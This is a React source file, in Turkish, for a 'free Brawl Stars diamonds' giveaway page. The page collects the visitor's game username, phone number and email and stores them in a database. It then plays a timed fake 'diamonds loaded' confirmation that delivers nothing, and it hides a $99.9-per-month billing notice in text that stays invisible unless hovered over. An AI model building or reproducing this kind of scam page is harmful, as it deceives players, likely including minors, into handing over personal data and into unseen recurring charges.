import loadingGif from './assets/loading-image.gif'
import succesVideo from './assets/4a10e39ee8325a06daf00881ac321b2f.mp4'
import elmas from './assets/elmas.png'
import spike from './assets/476128634_598851849697655_723455698161082559_n.png'
import { useState } from 'react'
import { addUser } from '../db'

const Modal = ({ close }: { close: () => void }) => {
  const [loading, setLoading] = useState(true)
  setTimeout(() => {
    setLoading(false)
  }, 2500);
  const retry = () => {
    setLoading(true)
    setTimeout(() => {
      setLoading(false)
    }, 4000);
  }
  return (
    <div
      id='modal-bg'
      className='absolute top-0 left-0 z-20 h-full w-full bg-slate-900/60 flex items-center justify-center'
    >
      <div className='bg-[#eaedee] rounded-4xl flex flex-col gap-y-3 w-96 h-[600px] p-3'>
        <div id='top' className='w-full flex flex-row'>
          <div className='w-full flex flex-row gap-x-2 items-center text-2xl'>
            {loading ? (
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="size-12">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
              </svg>
            ) : (
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="size-12">
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
              </svg>
            )}
            <span>{loading ? 'İşleminiz Onaylanıyor' : 'İşleminiz Onaylandı'}</span>
          </div>
          <button onClick={close} className='cursor-pointer'>
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="size-6">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18 18 6M6 6l12 12" />
            </svg>
          </button>
        </div>
        <div id='content'>
          {loading ? (
            <div className='flex flex-col items-center justify-center'>
              <img src={loadingGif} alt="Loading..." width={200} />
              <div className='text-3xl text-center'>Lütfen elmaslarınız hesabınıza yüklenirken sayfayı yenilemeyiniz!</div>
            </div>
          ) : (
            <div className='flex flex-col items-center justify-center text-center text-2xl'>
              <video className='outline-none' src={succesVideo} controls={false} autoPlay/>
              <span>Elmaslarınız hesabınıza yüklenmiştir.</span>
              <div id='fail'>
                <span className='underline'>Bir sorun mu yaşadınız?</span>
                <button onClick={retry} className='cursor-pointer px-3 py-2 border-2 border-black bg-black text-white hover:bg-inherit hover:text-black rounded-lg'>
                  Tekrar Dene
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

const App = () => {
  const [isOpen, setIsOpen] = useState(false)
  const [username, setUsername] = useState('')
  const [email, setEmail] = useState('')
  const [phone, setPhone] = useState<number>(0)
  return (
    <>
      <div className='flex flex-col gap-y-1 justify-center items-center w-full h-full'>
        <h1 className='text-7xl'>Bedava Elmas Kazan!</h1>
        <div className='flex flex-row gap-x-5'>
          <img
            src={elmas}
            alt='elmas babası'
            width='300'
          />
          <img
            src={spike}
            alt='kaslıspike'
          />
        </div>
        <p>Aşağıdaki formu doldurarak şansını dene.</p>
        <div className='flex flex-col gap-y-3'>
          <div className='flex flex-row gap-x-3'>
            <input
              onInput={e => setUsername(e.currentTarget.value)}
              type='text'
              id='username'
              placeholder='Brawl Stars İsminiz'
            />
            <input
              onInput={e => setPhone(Number(e.currentTarget.value))}
              type='number'
              id='phone-number'
              placeholder='Telefon Numaranız'
            />
            <input
              onInput={e => setEmail(e.currentTarget.value)}
              type='email'
              id='email'
              placeholder='Email Adresiniz'
              className='invalid:border-pink-500 invalid:text-pink-600'
            />
          </div>
          <button
            onClick={async () => {
              setIsOpen(true)
              await addUser(username, phone, email).then(console.log)
            }}
            className='cursor-pointer px-3 py-2 border-2 border-black bg-black text-white hover:bg-inherit hover:text-black rounded-lg'
          >
            Elmasları Al
          </button>
        </div>
        <div className='h-full'/>
        <div className='opacity-0 hover:opacity-100 flex flex-row gap-x-1 justify-center items-center'>
          <span>
            Telefon numarası ve isim uyuşuyor ise fatura yapılandırması olarak
          </span>
          <svg
            xmlns='http://www.w3.org/2000/svg'
            fill='none'
            viewBox='0 0 24 24'
            strokeWidth={1.5}
            stroke='currentColor'
            className='size-6'
          >
            <path
              strokeLinecap='round'
              strokeLinejoin='round'
              d='M2.25 18.75a60.07 60.07 0 0 1 15.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 0 1 3 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 0 0-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 0 1-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 0 0 3 15h-.75M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Zm3 0h.008v.008H18V10.5Zm-12 0h.008v.008H6V10.5Z'
            />
          </svg>
          <span>$99.9/ay ücretlendirme vardır</span>
        </div>
      </div>
      {isOpen && <Modal close={() => setIsOpen(false)} />}
    </>
  )
}

export default App
